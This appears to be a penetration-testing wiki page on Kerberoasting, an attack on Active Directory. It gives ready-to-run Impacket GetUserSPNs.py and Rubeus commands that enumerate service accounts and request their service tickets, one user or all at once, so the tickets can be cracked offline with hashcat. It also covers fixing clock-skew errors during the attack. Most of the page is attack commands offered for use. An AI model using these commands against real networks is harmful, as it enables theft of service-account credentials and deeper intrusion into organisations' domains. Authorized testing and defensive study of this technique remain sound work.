# Kerberoasting

**Any** domain user can retrieve a service ticket that is encrypted with the NTLM hash of the service owner in an Active Directory environment. Often the accounts that own a particular service are computer accounts, but are sometimes user accounts (called service accounts). These service accounts are said to be "Kerberoastable." With the hash-encrypted service ticket in hand, you can attempt to crack the encryption offline and use the cracked hash for further access into the environment.

It is possible to enumerate Kerberoastable domain users by finding those whose list of [[service-principal-name|service principal names (SPNs)]] is not null.

![Kerberoasting Flow](kerberoasting.png)

---

## Discover which Users are "Kerberoastable"

On Linux or Windows (collectors for both):
- [[bloodhound#Discover Kerberoastable Users|BloodHound]]

On Linux:
- [[pywerview#Gather Users that are kerberoasting Kerberoastable|pywerview]]
- [[windapsearch#Enumerate all users with service principal names for kerberoasting|windapsearch]]

```bash
GetUserSPNs.py $DOMAIN/$DOMAIN_USER[:$DOMAIN_USER_PASSWORD] [-hashes $LMHASH:$NTLMHASH] -dc-ip $DC_IP
```

---

## Kerberoast a Particular Domain User from Linux (credentials required)

```bash
GetUserSPNs.py $DOMAIN/$DOMAIN_USER[:$DOMAIN_USER_PASSWORD] [-hashes $LMHASH:$NTLMHASH] -dc-ip $DC_IP -request-user $SERVICE_USERNAME
```

- `$SERVICE_USERNAME` is the username of the service account (not the full [[service-principal-name|SPN]], just the username)

---

## Automatically Exploit All Kerberoastable Users on the Domain from Linux (credentials required)

```bash
GetUserSPNs.py $DOMAIN/$DOMAIN_USER[:$DOMAIN_USER_PASSWORD] [-hashes $LMHASH:$NTLMHASH] -dc-ip $DC_IP -request
```

---

## Kerberoast a Particular Domain User from a Domain-Joined Windows Computer

- [[Kerberoast#Kerberoast a Particular User|From a Covenant Grunt]]

---

## Automatically Exploit All Kerberoastable Users on the Domain from a Domain-Joined Windows Computer

Must be executed in the context of at least a domain user account.

```powershell
Rubeus.exe kerberoast
```


---

## [[hashcat#Offline dictionary attack against a Service Ticket kerberoasting Kerberoasting|Crack the Service Ticket with Hashcat]]

---

## "Clock skew is too great" impacket error

If you get this error, you need to synchronize your system's time with the time of the domain controller.

1. Figure out the domain controller's time

    ```bash
    $ sudo ntpdate $DOMAIN_CONTROLLER_IP
	14 Jan 19:08:30 ntpdate[16001]: step time server 10.10.10.110 offset 7200.165851 sec
    ```

2. Disable NTP

    ```bash
    sudo timedatectl set-ntp false
    ```

3. Manually set your time to the domain controller's time

    ```bash
    sudo timedatectl set-time $TIME
    ```
	
	- `$TIME` should be in the format `HH:MM:SS`

4. The error should be solved now. Do what you need to do!

5. Reenable NTP to get your time back to its original

    ```bash
    sudo timedatectl set-ntp true
    ```

